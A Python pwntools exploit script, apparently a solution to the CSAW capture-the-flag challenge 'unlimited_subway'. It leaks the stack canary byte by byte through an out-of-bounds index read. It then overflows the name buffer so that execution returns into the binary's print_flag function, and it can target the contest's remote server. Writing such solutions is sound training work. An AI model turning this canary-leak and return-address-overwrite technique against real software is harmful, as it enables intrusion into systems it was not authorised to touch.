#!/usr/bin/env python3
from pwn import *

BIN = '/home/ctfplayer/ctf_files/share/unlimited_subway'
elf = context.binary = ELF(BIN)
context.log_level = 'info'

HOST, PORT = 'pwn.chal.csaw.io', 7900

MENU_PROMPT = b'> '

def start(argv=[]):
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([BIN]+argv)

def choose(io, c: bytes):
    # menu uses read(0,&choice,2), so send 2 bytes including newline
    if len(c)==1:
        c += b'\n'
    io.send(c)

def leak_byte(io, idx: int) -> int:
    choose(io, b'V')
    io.recvuntil(b'Index : ')
    io.sendline(str(idx).encode())
    line = io.recvline()
    # line like: b'Index 128 : 3a\n'
    hx = line.strip().split(b':')[-1].strip()
    return int(hx, 16)

def leak_canary(io):
    canary_bytes = bytes([leak_byte(io, i) for i in range(128, 132)])
    canary = u32(canary_bytes)
    log.info(f"leaked canary bytes={canary_bytes.hex()} value={hex(canary)}")
    return canary

def exploit(io):
    canary = leak_canary(io)

    choose(io, b'E')
    io.recvuntil(b'Name Size : ')

    offset = 0x3c  # from local_48 to canary
    payload = b'A'*offset + p32(canary) + b'B'*4 + p32(elf.symbols['print_flag'])

    io.sendline(str(len(payload)).encode())
    io.recvuntil(b'Name : ')
    io.send(payload)
    io.interactive()

if __name__ == '__main__':
    io = start()
    exploit(io)

